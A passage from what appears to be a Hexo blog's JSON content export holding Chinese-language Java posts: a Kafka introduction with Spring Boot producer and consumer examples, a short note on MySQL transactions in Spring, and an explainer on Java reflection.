!&quot;);</span><br><span class=\"line\">            while(true)&#123;</span><br><span class=\"line\">                ConsumerRecords consumerRecords = kafkaConsumer.poll(1000);</span><br><span class=\"line\">                if(!consumerRecords.isEmpty())&#123;</span><br><span class=\"line\">                   for(Object consumerRecord: consumerRecords.records(&quot;testDemo&quot;))&#123;</span><br><span class=\"line\">                       ConsumerRecord temp = (ConsumerRecord)consumerRecord;</span><br><span class=\"line\">                       System.out.println(&quot;[*]: new data: &quot; + temp.value());</span><br><span class=\"line\">                   &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;catch (Exception e)&#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"四-其它\"><a href=\"#四-其它\" class=\"headerlink\" title=\"四.其它\"></a>四.其它</h1>","site":{"data":{}},"excerpt":"","more":"<p>win下Kafka测试环境搭建：<a href=\"https://blog.csdn.net/u012050154/article/details/76270655\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/u012050154/article/details/76270655</a></p>\n<h1 id=\"一-Kafka是什么\"><a href=\"#一-Kafka是什么\" class=\"headerlink\" title=\"一.Kafka是什么\"></a>一.Kafka是什么</h1><h2 id=\"1-是什么\"><a href=\"#1-是什么\" class=\"headerlink\" title=\"1.是什么\"></a>1.是什么</h2><p>我的理解是，kafka是一个分布式的消息队列，提供发布订阅功能.</p>\n<h2 id=\"2-专有名词\"><a href=\"#2-专有名词\" class=\"headerlink\" title=\"2.专有名词\"></a>2.专有名词</h2><p>Broker/Topic/Partition/Producer/Consumer/Consumer Group<br></p>\n<ul>\n<li><p>Broker</p>\n<p>Kafka集群包含一个或多个服务器，这种服务器被称为broker.</p>\n</li>\n<li><p>topic</p>\n<p>每条发布到Kafka集群的消息都有一个类别，这个类别被称为Topic（物理上不同Topic的消息分开存储[表现于日志落地]，逻辑上一个Topic的消息虽然保存于一个或多个broker上但用户只需指定消息的Topic即可生产或消费数据而不必关心数据存于何处）</p>\n</li>\n<li><p>partition</p>\n<p>Parition是物理上的概念，每个Topic包含一个或多个Partition.</p>\n</li>\n<li><p>Producer</p>\n<p>消息生产者</p>\n</li>\n<li><p>Consumer</p>\n<p>消息消费者</p>\n</li>\n<li><p>Consumer Group</p>\n<p>消费者所属组，组内的所有消费者协调在一起来消费订阅主题(subscribed topics)的所有分区(partition)。当然，每个分区只能由同一个消费组内的一个consumer来消费.<br><br>重要的再说一遍: Consumer Group下订阅的topic下的某一个分区只能分配给某个group下的一个consumer(当然该分区还可以被分配给其他group).</p>\n</li>\n</ul>\n<h1 id=\"二-Kafka作用与意义\"><a href=\"#二-Kafka作用与意义\" class=\"headerlink\" title=\"二.Kafka作用与意义\"></a>二.Kafka作用与意义</h1><p>为什么要用它,与其它产品相比怎么样？</p>\n<h2 id=\"1-为什么用它\"><a href=\"#1-为什么用它\" class=\"headerlink\" title=\"1.为什么用它\"></a>1.为什么用它</h2><h3 id=\"高吞吐率，高性能\"><a href=\"#高吞吐率，高性能\" class=\"headerlink\" title=\"高吞吐率，高性能\"></a>高吞吐率，高性能</h3><p><br>怎么实现？<br></p>\n<ul>\n<li><p>写入</p>\n<p>基于操作系统的页缓存来写入文件，相当于kafka将文件写入内存，然后由操作系统来决定什么时候将内存中的信息写入磁盘。</p>\n<p>以磁盘顺序来写入数据，不会在文件随机位置修改数据。</p>\n</li>\n<li><p>读取</p>\n<p>零拷贝技术，省略了两次拷贝(OS Cache将数据拷贝到应用程序缓存和 应用程序缓存拷贝数据到socket缓存)，直接将数据发送到网卡.</p>\n<p><img src=\"http://67.216.218.49:8000/file/blogs/java/bigdata/kafka_data_transmission_01.png\" alt=\"kafka_data_transmission\"></p>\n<p>原图出处: <a href=\"https://juejin.im/post/5cc00ac95188250a59405322\" target=\"_blank\" rel=\"noopener\">https://juejin.im/post/5cc00ac95188250a59405322</a></p>\n</li>\n</ul>\n<h3 id=\"分布式\"><a href=\"#分布式\" class=\"headerlink\" title=\"分布式\"></a>分布式</h3><p>数据分布式存储(特点就是可以存极大数据)，消费者可以根据分区来进行读取。</p>\n<h3 id=\"消息队列的通用优点\"><a href=\"#消息队列的通用优点\" class=\"headerlink\" title=\"消息队列的通用优点\"></a>消息队列的通用优点</h3><p>灵活，销峰，缓冲等。</p>\n<h2 id=\"2-和redis区别\"><a href=\"#2-和redis区别\" class=\"headerlink\" title=\"2.和redis区别\"></a>2.和redis区别</h2><h3 id=\"kafka发布订阅模式，和redis有啥不同？\"><a href=\"#kafka发布订阅模式，和redis有啥不同？\" class=\"headerlink\" title=\"kafka发布订阅模式，和redis有啥不同？\"></a>kafka发布订阅模式，和redis有啥不同？</h3><h1 id=\"三-怎么用\"><a href=\"#三-怎么用\" class=\"headerlink\" title=\"三.怎么用\"></a>三.怎么用</h1><h2 id=\"1-springboot中kafka集成\"><a href=\"#1-springboot中kafka集成\" class=\"headerlink\" title=\"1.springboot中kafka集成\"></a>1.springboot中kafka集成</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">      &lt;groupId&gt;org.springframework.kafka&lt;/groupId&gt;</span><br><span class=\"line\">      &lt;artifactId&gt;spring-kafka&lt;/artifactId&gt;</span><br><span class=\"line\">      &lt;version&gt;2.2.9.RELEASE&lt;/version&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>\n<p>配置文件application.properties<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">server.port=8888</span><br><span class=\"line\"></span><br><span class=\"line\">#kafka，更多配置查看kafka的属性类：org.springframework.boot.autoconfigure.kafka.KafkaProperties</span><br><span class=\"line\">#指定kafka 代理地址，可以多个</span><br><span class=\"line\">#spring.kafka.bootstrap-servers=192.168.1.159:9092,192.168.1.159:9093,192.168.1.159:9094</span><br><span class=\"line\">spring.kafka.bootstrap-servers=localhost:9092</span><br><span class=\"line\">#指定默认topic id</span><br><span class=\"line\">spring.kafka.template.default-topic=testDemo</span><br><span class=\"line\">#指定listener 容器中的线程数，用于提高并发量</span><br><span class=\"line\">spring.kafka.listener.concurrency=3</span><br><span class=\"line\">#每次批量发送消息的数量</span><br><span class=\"line\">spring.kafka.producer.batch-size=1000</span><br><span class=\"line\">#将Java对象转换成字节数组发送给broker</span><br><span class=\"line\">spring.kafka.producer.key-serializer=org.apache.kafka.common.serialization.StringSerializer</span><br><span class=\"line\">spring.kafka.producer.value-serializer=org.apache.kafka.common.serialization.StringSerializer</span><br><span class=\"line\"></span><br><span class=\"line\">#指定默认消费者group id</span><br><span class=\"line\">spring.kafka.consumer.group-id=myGroup1</span><br><span class=\"line\">#若设置为earliest，那么会从头开始读partition，latest读取最新的</span><br><span class=\"line\">spring.kafka.consumer.auto-offset-reset=latest</span><br><span class=\"line\">#将字节数组读取</span><br><span class=\"line\">spring.kafka.consumer.key-deserializer=org.apache.kafka.common.serialization.StringDeserializer</span><br><span class=\"line\">spring.kafka.consumer.value-deserializer=org.apache.kafka.common.serialization.StringDeserializer</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"2-生产一条消息\"><a href=\"#2-生产一条消息\" class=\"headerlink\" title=\"2.生产一条消息\"></a>2.生产一条消息</h2><p>KafkaTemplate 是Spring提供的用来发消息的实现类，可以在application.properties中进行配置属性，也可以用kafka自己的KafkaProducer来send()消息.</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import org.apache.kafka.clients.producer.KafkaProducer;</span><br><span class=\"line\">import org.apache.kafka.clients.producer.ProducerRecord;</span><br><span class=\"line\">import org.springframework.beans.factory.annotation.Autowired;</span><br><span class=\"line\">import org.springframework.kafka.core.KafkaTemplate;</span><br><span class=\"line\">import org.springframework.stereotype.Component;</span><br><span class=\"line\"></span><br><span class=\"line\">import java.util.Properties;</span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\"> * kafka生产者send()消息demo</span><br><span class=\"line\"> *</span><br><span class=\"line\"> * 两种，一种是Spring提供的可以用spring配置的KafkaTemplate</span><br><span class=\"line\"> * 一种是Kafka自带的，需要自己注入配置信息的KafkaProducer</span><br><span class=\"line\"> */</span><br><span class=\"line\"></span><br><span class=\"line\">@Component</span><br><span class=\"line\">public class ProducerDemo &#123;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    @Autowired</span><br><span class=\"line\">    private KafkaTemplate kafkaTemplate;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    public void send1()&#123;</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            kafkaTemplate.send(&quot;testDemo&quot;,&quot;data1&quot;);</span><br><span class=\"line\">            System.out.println(&quot;[*]: send success 1 !&quot;);</span><br><span class=\"line\">        &#125;catch (Exception e)&#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public void send2()&#123;</span><br><span class=\"line\">        Properties kafkaProps = new Properties();</span><br><span class=\"line\">        kafkaProps.put(&quot;bootstrap.servers&quot;,&quot;localhost:9092&quot;);</span><br><span class=\"line\">        kafkaProps.put(&quot;key.serializer&quot;,&quot;org.apache.kafka.common.serialization.StringSerializer&quot;);</span><br><span class=\"line\">        kafkaProps.put(&quot;value.serializer&quot;,&quot;org.apache.kafka.common.serialization.StringSerializer&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">        KafkaProducer producer = new KafkaProducer&lt;String, String&gt;(kafkaProps);</span><br><span class=\"line\"></span><br><span class=\"line\">        ProducerRecord record = new ProducerRecord(&quot;testDemo&quot;,&quot;data2&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">        try&#123;</span><br><span class=\"line\">            producer.send(record);</span><br><span class=\"line\">            System.out.println(&quot;[*]: send success 2 !&quot;);</span><br><span class=\"line\">        &#125;catch (Exception e)&#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"3-订阅消费消息\"><a href=\"#3-订阅消费消息\" class=\"headerlink\" title=\"3.订阅消费消息\"></a>3.订阅消费消息</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import org.apache.kafka.clients.consumer.ConsumerRecord;</span><br><span class=\"line\">import org.apache.kafka.clients.consumer.ConsumerRecords;</span><br><span class=\"line\">import org.apache.kafka.clients.consumer.KafkaConsumer;</span><br><span class=\"line\">import org.springframework.kafka.annotation.KafkaListener;</span><br><span class=\"line\">import org.springframework.stereotype.Component;</span><br><span class=\"line\"></span><br><span class=\"line\">import java.util.ArrayList;</span><br><span class=\"line\">import java.util.List;</span><br><span class=\"line\">import java.util.Properties;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\"> * kafka消费消息demo</span><br><span class=\"line\"> *</span><br><span class=\"line\"> * 1.@KafkaListener 注解为Spring提供用来监听数据的，</span><br><span class=\"line\"> * 由KafkaListenerAnnotationBeanPostProcessor类在postProcessAfterInitialization()时读取所有@Kafkalistener注解</span><br><span class=\"line\"> *</span><br><span class=\"line\"> * 2.KafkaConsumer为kafka自带的类，需要自己初始化配置文件</span><br><span class=\"line\"> */</span><br><span class=\"line\">@Component</span><br><span class=\"line\">public class ConsumerDemo &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    @KafkaListener(id = &quot;testConsumer1&quot;, topics = &quot;testDemo&quot;, groupId = &quot;myGroup1&quot;)</span><br><span class=\"line\">    public void receive1(String data)&#123;</span><br><span class=\"line\">        System.out.println(&quot;[*]: receive success 1 !&quot;);</span><br><span class=\"line\">        System.out.println(data);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public void receive2()&#123;</span><br><span class=\"line\">        Properties kafkaProps = new Properties();</span><br><span class=\"line\">        kafkaProps.put(&quot;bootstrap.servers&quot;,&quot;localhost:9092&quot;);</span><br><span class=\"line\">        kafkaProps.put(&quot;group.id&quot;,&quot;myGroup1&quot;);</span><br><span class=\"line\">        kafkaProps.put(&quot;key.deserializer&quot;,&quot;org.apache.kafka.common.serialization.StringDeserializer&quot;);</span><br><span class=\"line\">        kafkaProps.put(&quot;value.deserializer&quot;,&quot;org.apache.kafka.common.serialization.StringDeserializer&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">        KafkaConsumer kafkaConsumer = new KafkaConsumer(kafkaProps);</span><br><span class=\"line\"></span><br><span class=\"line\">        //List topics = List.of(&quot;testDemo&quot;);</span><br><span class=\"line\">        List&lt;String&gt; topics = new ArrayList&lt;&gt;();</span><br><span class=\"line\">        topics.add(&quot;testDemo&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            kafkaConsumer.subscribe(topics);</span><br><span class=\"line\">            System.out.println(&quot;[*]: receive success 2 !&quot;);</span><br><span class=\"line\">            while(true)&#123;</span><br><span class=\"line\">                ConsumerRecords consumerRecords = kafkaConsumer.poll(1000);</span><br><span class=\"line\">                if(!consumerRecords.isEmpty())&#123;</span><br><span class=\"line\">                   for(Object consumerRecord: consumerRecords.records(&quot;testDemo&quot;))&#123;</span><br><span class=\"line\">                       ConsumerRecord temp = (ConsumerRecord)consumerRecord;</span><br><span class=\"line\">                       System.out.println(&quot;[*]: new data: &quot; + temp.value());</span><br><span class=\"line\">                   &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;catch (Exception e)&#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"四-其它\"><a href=\"#四-其它\" class=\"headerlink\" title=\"四.其它\"></a>四.其它</h1>"},{"title":"spring中mysql事务","date":"2019-06-10T19:53:43.000Z","_content":"\n### 1.springboot中使用mysql事务\n##### (1).pom.xml\n```\n<!-- mybatis配置 -->\n<dependency>\n    <groupId>org.mybatis.spring.boot</groupId>\n    <artifactId>mybatis-spring-boot-starter</artifactId>\n    <version>1.3.2</version>\n</dependency>\n<!-- end mybatis -->\n<!-- mysql驱动 -->\n<dependency>\n    <groupId>mysql</groupId>\n    <artifactId>mysql-connector-java</artifactId>\n    <scope>runtime</scope>\n</dependency>\n<!-- end mysql -->\n```\n##### (2)@EnableTransactionManagement\n启动类打开@EnableTransactionManagement注解\n\n##### (3)使用事务\n```\n@Transactional(rollbackFor = Exception.class)\n   public void addData(){\n       testMapper.insertData1(1,\"111\");\n       testMapper.insertData2(1,\"012345678910\");\n   }\n```\n","source":"_posts/java/mysql事务.md","raw":"---\ntitle: spring中mysql事务\ndate: 2019-6-10 15:53:43\ntags: [mysql]\n---\n\n### 1.springboot中使用mysql事务\n##### (1).pom.xml\n```\n<!-- mybatis配置 -->\n<dependency>\n    <groupId>org.mybatis.spring.boot</groupId>\n    <artifactId>mybatis-spring-boot-starter</artifactId>\n    <version>1.3.2</version>\n</dependency>\n<!-- end mybatis -->\n<!-- mysql驱动 -->\n<dependency>\n    <groupId>mysql</groupId>\n    <artifactId>mysql-connector-java</artifactId>\n    <scope>runtime</scope>\n</dependency>\n<!-- end mysql -->\n```\n##### (2)@EnableTransactionManagement\n启动类打开@EnableTransactionManagement注解\n\n##### (3)使用事务\n```\n@Transactional(rollbackFor = Exception.class)\n   public void addData(){\n       testMapper.insertData1(1,\"111\");\n       testMapper.insertData2(1,\"012345678910\");\n   }\n```\n","slug":"java/mysql事务","published":1,"updated":"2019-10-13T12:15:12.172Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321i3001b6dcp2a3grjeh","content":"<h3 id=\"1-springboot中使用mysql事务\"><a href=\"#1-springboot中使用mysql事务\" class=\"headerlink\" title=\"1.springboot中使用mysql事务\"></a>1.springboot中使用mysql事务</h3><h5 id=\"1-pom-xml\"><a href=\"#1-pom-xml\" class=\"headerlink\" title=\"(1).pom.xml\"></a>(1).pom.xml</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- mybatis配置 --&gt;</span><br><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">    &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt;</span><br><span class=\"line\">    &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt;</span><br><span class=\"line\">    &lt;version&gt;1.3.2&lt;/version&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br><span class=\"line\">&lt;!-- end mybatis --&gt;</span><br><span class=\"line\">&lt;!-- mysql驱动 --&gt;</span><br><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">    &lt;groupId&gt;mysql&lt;/groupId&gt;</span><br><span class=\"line\">    &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;</span><br><span class=\"line\">    &lt;scope&gt;runtime&lt;/scope&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br><span class=\"line\">&lt;!-- end mysql --&gt;</span><br></pre></td></tr></table></figure>\n<h5 id=\"2-EnableTransactionManagement\"><a href=\"#2-EnableTransactionManagement\" class=\"headerlink\" title=\"(2)@EnableTransactionManagement\"></a>(2)@EnableTransactionManagement</h5><p>启动类打开@EnableTransactionManagement注解</p>\n<h5 id=\"3-使用事务\"><a href=\"#3-使用事务\" class=\"headerlink\" title=\"(3)使用事务\"></a>(3)使用事务</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@Transactional(rollbackFor = Exception.class)</span><br><span class=\"line\">   public void addData()&#123;</span><br><span class=\"line\">       testMapper.insertData1(1,&quot;111&quot;);</span><br><span class=\"line\">       testMapper.insertData2(1,&quot;012345678910&quot;);</span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"1-springboot中使用mysql事务\"><a href=\"#1-springboot中使用mysql事务\" class=\"headerlink\" title=\"1.springboot中使用mysql事务\"></a>1.springboot中使用mysql事务</h3><h5 id=\"1-pom-xml\"><a href=\"#1-pom-xml\" class=\"headerlink\" title=\"(1).pom.xml\"></a>(1).pom.xml</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- mybatis配置 --&gt;</span><br><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">    &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt;</span><br><span class=\"line\">    &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt;</span><br><span class=\"line\">    &lt;version&gt;1.3.2&lt;/version&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br><span class=\"line\">&lt;!-- end mybatis --&gt;</span><br><span class=\"line\">&lt;!-- mysql驱动 --&gt;</span><br><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">    &lt;groupId&gt;mysql&lt;/groupId&gt;</span><br><span class=\"line\">    &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;</span><br><span class=\"line\">    &lt;scope&gt;runtime&lt;/scope&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br><span class=\"line\">&lt;!-- end mysql --&gt;</span><br></pre></td></tr></table></figure>\n<h5 id=\"2-EnableTransactionManagement\"><a href=\"#2-EnableTransactionManagement\" class=\"headerlink\" title=\"(2)@EnableTransactionManagement\"></a>(2)@EnableTransactionManagement</h5><p>启动类打开@EnableTransactionManagement注解</p>\n<h5 id=\"3-使用事务\"><a href=\"#3-使用事务\" class=\"headerlink\" title=\"(3)使用事务\"></a>(3)使用事务</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@Transactional(rollbackFor = Exception.class)</span><br><span class=\"line\">   public void addData()&#123;</span><br><span class=\"line\">       testMapper.insertData1(1,&quot;111&quot;);</span><br><span class=\"line\">       testMapper.insertData2(1,&quot;012345678910&quot;);</span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure>\n"},{"title":"Java反射","date":"2018-11-07T15:30:33.000Z","_content":"\n详见:https://www.sczyh30.com/posts/Java/java-reflection-1/<br>\nhttps://blog.csdn.net/ljphhj/article/details/12858767\n#### 1.什么是反射\n>Reflection enables Java code to discover information about the fields, methods and constructors of loaded classes, and to use reflected fields, methods, and constructors to operate on their underlying counterparts, within security restrictions.\nThe API accommodates applications that need access to either the public members of a target object (based on its runtime class) or the members declared by a given class. It also allows programs to suppress default reflective access control\n\n反射机制允许运行中的 Java 程序获取自身的信息，并且可以操作类或对象的内部属性。<br>\n反射的核心是 JVM 在运行时才动态加载类或调用方法/访问属性，它不需要事先（写代码的时候或编译期）知道运行对象是谁。<br>\nJava 反射主要提供以下功能：\n- 在运行时判断任意一个对象所属的类；\n- 在运行时构造任意一个类的对象；\n- 在运行时判断任意一个类所具有的成员变量和方法（通过反射甚至可以调用private方法）；\n- 在运行时调用任意一个对象的方法\n\n<strong>在运行时，而不是编译时.</strong>\n","source":"_posts/java/reflect.md","raw":"---\ntitle: Java反射\ndate: 2018-11-07 10:30:33\ntags: [java]\n---\n\n详见:https://www.sczyh30.com/posts/Java/java-reflection-1/<br>\nhttps://blog.csdn.net/ljphhj/article/details/12858767\n#### 1.什么是反射\n>Reflection enables Java code to discover information about the fields, methods and constructors of loaded classes, and to use reflected fields, methods, and constructors to operate on their underlying counterparts, within security restrictions.\nThe API accommodates applications that need access to either the public members of a target object (based on its runtime class) or the members declared by a given class. It also allows programs to suppress default reflective access control\n\n反射机制允许运行中的 Java 程序获取自身的信息，并且可以操作类或对象的内部属性。<br>\n反射的核心是 JVM 在运行时才动态加载类或调用方法/访问属性，它不需要事先（写代码的时候或编译期）知道运行对象是谁。<br>\nJava 反射主要提供以下功能：\n- 在运行时判断任意一个对象所属的类；\n- 在运行时构造任意一个类的对象；\n- 在运行时判断任意一个类所具有的成员变量和方法（通过反射甚至可以调用private方法）；\n- 在运行时调用任意一个对象的方法\n\n<strong>在运行时，而不是编译时.</strong>\n","slug":"java/reflect","published":1,"updated":"2019-10-13T12:15:12.172Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321i4001d6dcp9resqbfb","content":"<p>详见:<a href=\"https://www.sczyh30.com/posts/Java/java-reflection-1/\" target=\"_blank\" rel=\"noopener\">https://www.sczyh30.com/posts/Java/java-reflection-1/</a><br><br><a href=\"https://blog.csdn.net/ljphhj/article/details/12858767\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/ljphhj/article/details/12858767</a></p>\n<h4 id=\"1-什么是反射\"><a href=\"#1-什么是反射\" class=\"headerlink\" title=\"1.什么是反射\"></a>1.什么是反射</h4><blockquote>\n<p>Reflection enables Java code to discover information about the fields, methods and constructors of loaded classes, and to use reflected fields, methods, and constructors to operate on their underlying counterparts, within security restrictions.<br>The API accommodates applications that need access to either the public members of a target object (based on its runtime class) or the members declared by a given class. It also allows programs to suppress default reflective access control</p>\n</blockquote>\n<p>反射机制允许运行中的 Java 程序获取自身的信息，并且可以操作类或对象的内部属性。<br><br>反射的核心是 JVM 在运行时才动态加载类或调用方法/访问属性，它不需要事先（写代码的时候或编译期）知道运行对象是谁。<br><br>Java 反射主要提供以下功能：</p>\n<ul>\n<li>在运行时判断任意一个对象所属的类；</li>\n<li>在运行时构造任意一个类的对象；</li>\n<li>在运行时判断任意一个类所具有的成员变量和方法（通过反射甚至可以调用private方法）；</li>\n<li>在运行时调用任意一个对象的方法</li>\n</ul>\n<p><strong>在运行时，而不是编译时.</strong></p>\n","site":{"data":{}},"excerpt":"","more":"<p>详见:<a href=\"https://www.sczyh30.com/posts/Java/java-reflection-1/\" target=\"_blank\" rel=\"noopener\">https://www.sczyh30.com/posts/Java/java-reflection-1/</a><br><br><a href=\"https://blog.csdn.net/ljphhj/article/details/12858767\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/ljphhj/article/details/12858767</a></p>\n<h4 id=\"1-什么是反射\"><a href=\"#1-什么是反射\" class=\"headerlink\" 